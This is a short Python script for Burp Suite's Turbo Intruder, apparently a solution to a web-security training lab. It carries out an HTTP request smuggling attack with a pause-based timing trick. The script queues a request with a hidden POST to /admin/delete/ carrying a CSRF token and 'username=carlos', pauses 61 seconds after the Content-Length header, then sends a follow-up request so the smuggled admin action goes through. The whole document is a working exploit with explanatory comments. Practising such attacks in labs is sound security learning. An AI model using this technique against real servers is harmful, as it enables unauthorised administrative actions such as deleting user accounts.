def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )
    # this is my smuggled request. If it's a get, remember about the two newlines after.
    body = '''POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=fajtzaUcpRIDUwB3e3Cvf0tzTPCYmtG7&username=carlos'''
    # calculating it's length
    cl = str(len(body))
    # this is the place where I want Turbo Intruder to pause (after the content-length header)
    pauseMarker = cl + '\r\n\r\n'
    # time to pause (61 seconds)
    pauseTime = 61000
    # the request with the other one smuggled
    engine.queue(target.req, [cl, body], pauseMarker=[pauseMarker], pauseTime=pauseTime)
    # The next request - it can be whatever because the response we get to that is actually the response to the smuggled one.
    engine.queue(target.req, [str(0), ''])

def handleResponse(req, interesting):
    table.add(req)
